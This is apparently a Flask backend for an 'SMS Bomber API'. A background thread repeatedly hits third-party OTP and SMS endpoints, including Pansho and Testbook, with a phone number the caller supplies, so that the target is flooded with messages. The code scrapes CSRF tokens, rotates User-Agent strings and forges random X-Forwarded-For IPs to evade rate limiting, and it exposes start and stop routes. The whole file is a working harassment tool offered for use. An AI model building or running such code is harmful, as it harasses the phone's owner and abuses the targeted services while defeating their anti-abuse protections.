from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
import json
import os
import time
import random
import threading
import requests as req_lib
from datetime import datetime
from bs4 import BeautifulSoup

app = Flask(__name__, static_folder='../admin', static_url_path='/admin')
CORS(app)

# ===== DATA FILES =====
REQUESTS_FILE = 'requests/requests.json'
STATS_FILE = 'requests/stats.json'

# ===== LOAD DATA =====
def load_requests():
    try:
        with open(REQUESTS_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_stats(data):
    try:
        with open(STATS_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

def load_stats():
    try:
        with open(STATS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}

# ===== GLOBALS =====
requests_data = load_requests()
stats_data = load_stats()
bombing_active = False
bombing_thread = None
bombing_lock = threading.Lock()

# ===== PANSHO SESSION REFRESH =====
def get_pansho_session():
    """Get fresh session for Pansho"""
    session = req_lib.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
    }
    
    try:
        # GET home page to get cookies and CSRF token
        resp = session.get('https://pansho.com/', headers=headers, timeout=10)
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        # Extract CSRF token
        token = None
        token_input = soup.find('input', {'name': '_token'})
        if token_input:
            token = token_input.get('value')
        if not token:
            meta = soup.find('meta', {'name': 'csrf-token'})
            if meta:
                token = meta.get('content')
        
        if not token:
            token = 'DUMMY_TOKEN'
        
        cookies = session.cookies.get_dict()
        return session, cookies, token
    except Exception as e:
        print(f"❌ Pansho session failed: {e}")
        return None, None, None

# ===== BOMBING ENGINE =====
def bombing_worker(phone):
    global bombing_active, stats_data
    active_requests = [r for r in requests_data if r.get('active', True)]
    
    if not active_requests:
        bombing_active = False
        return
    
    # Pansho session cache
    pansho_session = None
    pansho_cookies = {}
    pansho_token = None
    
    while bombing_active:
        for req in active_requests:
            if not bombing_active:
                break
            
            # If Pansho, refresh session every 10 requests
            if 'pansho' in req['name'].lower():
                if not pansho_session or stats_data['total_requests'] % 10 == 0:
                    pansho_session, pansho_cookies, pansho_token = get_pansho_session()
                    if not pansho_session:
                        time.sleep(1)
                        continue
            
            # Phone variations
            phone_variants = req.get('phones', [phone])
            target_phone = random.choice(phone_variants) if phone_variants else phone
            
            # Build request
            url = req['url'].replace('{phone}', target_phone)
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
            ])
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            try:
                # Use session for Pansho, fresh for Testbook
                if 'pansho' in req['name'].lower() and pansho_session:
                    session = pansho_session
                    # Update token in body
                    body = req['body'].replace('{phone}', target_phone)
                    body = body.replace('{token}', pansho_token)
                    if req['method'] == 'POST':
                        r = session.post(url, headers=headers, data=body, timeout=5)
                    else:
                        r = session.get(url, headers=headers, timeout=5)
                else:
                    # Testbook or other - fresh request
                    session = req_lib.Session()
                    if req['method'] == 'POST':
                        if isinstance(req['body'], dict):
                            r = session.post(url, headers=headers, json=req['body'], timeout=5)
                        else:
                            body = req['body'].replace('{phone}', target_phone)
                            r = session.post(url, headers=headers, data=body, timeout=5)
                    else:
                        r = session.get(url, headers=headers, timeout=5)
                
                with bombing_lock:
                    stats_data['total_requests'] += 1
                    if r.status_code in [200, 302, 201, 202]:
                        stats_data['success'] += 1
                    elif r.status_code == 429:
                        stats_data['rate_limited'] += 1
                    else:
                        stats_data['failed'] += 1
                    save_stats(stats_data)
                
                print(f"[{req['name']}] {r.status_code} | {target_phone}")
                
            except Exception as e:
                with bombing_lock:
                    stats_data['total_requests'] += 1
                    stats_data['failed'] += 1
                    save_stats(stats_data)
                print(f"[{req['name']}] ERROR: {str(e)[:50]}")
            
            # 0.6 sec delay = 100 req/min per thread
            time.sleep(0.6)

# ===== ROUTES =====

@app.route('/')
@app.route('/api/health')
def health():
    return jsonify({"status": "ok", "message": "SMS Bomber API is live!"})

@app.route('/api/requests', methods=['GET'])
def get_requests():
    return jsonify(requests_data)

@app.route('/api/stats', methods=['GET'])
def get_stats():
    active_count = sum(1 for r in requests_data if r.get('active', True))
    return jsonify({
        "total_requests": len(requests_data),
        "active_requests": active_count,
        "usage": stats_data
    })

@app.route('/api/bomb/start', methods=['POST'])
def start_bombing():
    global bombing_active, bombing_thread, stats_data
    
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({"error": "Phone number required"}), 400
    
    if bombing_active:
        return jsonify({"error": "Bombing already active"}), 400
    
    # Reset stats
    stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
    save_stats(stats_data)
    
    bombing_active = True
    bombing_thread = threading.Thread(target=bombing_worker, args=(phone,))
    bombing_thread.daemon = True
    bombing_thread.start()
    
    active_count = sum(1 for r in requests_data if r.get('active', True))
    return jsonify({
        "success": True,
        "message": f"Bombing started on {phone}",
        "phone": phone,
        "active_requests": active_count
    })

@app.route('/api/bomb/stop', methods=['POST'])
def stop_bombing():
    global bombing_active
    bombing_active = False
    return jsonify({
        "success": True,
        "message": "Bombing stopped",
        "stats": stats_data
    })

@app.route('/api/bomb/status', methods=['GET'])
def bombing_status():
    return jsonify({
        "active": bombing_active,
        "stats": stats_data,
        "active_requests": sum(1 for r in requests_data if r.get('active', True))
    })

@app.route('/admin')
@app.route('/admin/')
def serve_admin():
    return send_from_directory('../admin', 'index.html')

# ===== VERCEL ENTRY =====
app.debug = False

if __name__ == '__main__':
    app.run(debug=True, port=5000)
